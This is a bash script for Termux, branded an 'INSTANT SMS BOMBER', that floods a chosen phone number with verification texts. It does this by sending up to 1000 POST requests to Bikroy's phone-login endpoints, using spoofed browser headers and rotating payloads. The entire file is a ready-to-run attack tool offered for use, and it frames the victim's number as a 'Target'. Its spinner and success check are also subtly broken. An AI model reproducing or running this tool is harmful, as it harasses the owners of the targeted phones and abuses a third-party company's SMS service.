#!/data/data/com.termux/files/usr/bin/bash

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
WHITE='\033[1;37m'; NC='\033[0m'

# Animation
spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [\e[33m%c\e[m]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

banner() {
    clear
    echo -e "${RED}"
    cat << "EOF"
  ██████╗██╗  ██╗██████╗  █████╗ ████████╗███████╗██╗   ██╗
██╔════╝██║  ██║██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║   ██║
██║     ███████║██████╔╝███████║   ██║   █████╗  ██║   ██║
██║     ██╔══██║██╔══██╗██╔══██║   ██║   ██╔══╝  ██║   ██║
╚██████╗██║  ██║██████╔╝██║  ██║   ██║   ███████╗╚██████╔╝
 ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ 
EOF
    echo -e "${CYAN}    🔥 INSTANT SMS BOMBER - BIKROY API 🔥${NC}"
    echo -e "${YELLOW}                     v2.0 INSTANT${NC}\n"
}

# Multiple API endpoints for instant delivery
INSTANT_APIS=(
    "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="
    "https://api.bikroy.com/v1/auth/phone/verify"
    "https://bikroy.com/api/auth/phone-verification"
)

send_instant_sms() {
    local phone="$1"
    local count=0
    local total="$2"
    
    while [ $count -lt $total ]; do
        ((count++))
        
        # Random API selection for better success
        local api_idx=$((RANDOM % ${#INSTANT_APIS[@]}))
        local api_url="${INSTANT_APIS[$api_idx]}"
        
        echo -ne "${YELLOW}[SMS $count/$total]${NC} ${GREEN}$phone ${NC}-> "
        
        # Multiple payloads for instant trigger
        payloads=(
            '{"phone":"'"$phone"'","action":"verify"}'
            '{"phone_number":"'"$phone"'"}'
            '{"mobile":"'"$phone"'","otp":true}'
            '{"number":"'"$phone"'","verify":1}'
        )
        
        local payload_idx=$((RANDOM % ${#payloads[@]}))
        local payload="${payloads[$payload_idx]}"
        
        # FAST request - no delay for instant delivery
        response=$(curl -s -X POST "$api_url$phone" \
            -H "User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36" \
            -H "Accept: application/json" \
            -H "Content-Type: application/json" \
            -H "Origin: https://bikroy.com" \
            -H "Referer: https://bikroy.com/" \
            -d "$payload" \
            --connect-timeout 5 --max-time 8 2>/dev/null &
            CURL_PID=$!)
        
        spinner $CURL_PID
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✅ INSTANT${NC}"
        else
            echo -e "${RED}❌ Failed${NC}"
        fi
        
        # Ultra-fast loop - 0.3s delay max for instant spam
        sleep 0.3
        
        # Progress bar every 10 SMS
        if [ $((count % 10)) -eq 0 ]; then
            local progress=$((count * 100 / total))
            echo -e "${PURPLE}[$(printf '█%.0s' $(seq 1 $((progress/10))))] $progress% ($count/$total)${NC}\n"
        fi
    done
}

main() {
    banner
    
    echo -e "${BLUE}🎯 Target Info:${NC}"
    read -p "📱 Phone (01XXXXXXXXX): " phone
    read -p "💣 SMS Amount (1-1000): " amount
    
    # Quick validation
    if [[ ! "$phone" =~ ^01[3-9][0-9]{8}$ ]]; then
        echo -e "${RED}❌ Wrong format! Use: 01XXXXXXXXX${NC}"; exit 1
    fi
    
    if [ "$amount" -lt 1 ] || [ "$amount" -gt 1000 ]; then
        echo -e "${RED}❌ Amount: 1-1000${NC}"; exit 1
    fi
    
    echo -e "\n${CYAN}"
    echo "📱 Target: ${GREEN}$phone${NC}"
    echo "💣 Total SMS: ${GREEN}$amount${NC}"
    echo "⚡ Speed: ${RED}INSTANT MODE${NC}"
    echo -e "${NC}"
    
    read -p "🔥 Press Enter to START INSTANT BOMBER..."
    
    echo -e "\n${PURPLE}🚀 LAUNCHING INSTANT ATTACK...${NC}\n"
    send_instant_sms "$phone" "$amount"
    
    echo -e "\n${GREEN}🎉 INSTANT BOMBER COMPLETED!${NC}"
    echo -e "${YELLOW}$amount SMS sent to $phone${NC}"
}

# Dependencies
pkg_install_check() {
    if ! command -v curl >/dev/null 2>&1; then
        echo -e "${RED}Installing curl...${NC}"
        pkg install curl -y
    fi
}

pkg_install_check
trap 'echo -e "\n${RED}🛑 STOPPED!${NC}"; exit 0' INT
main "$@"
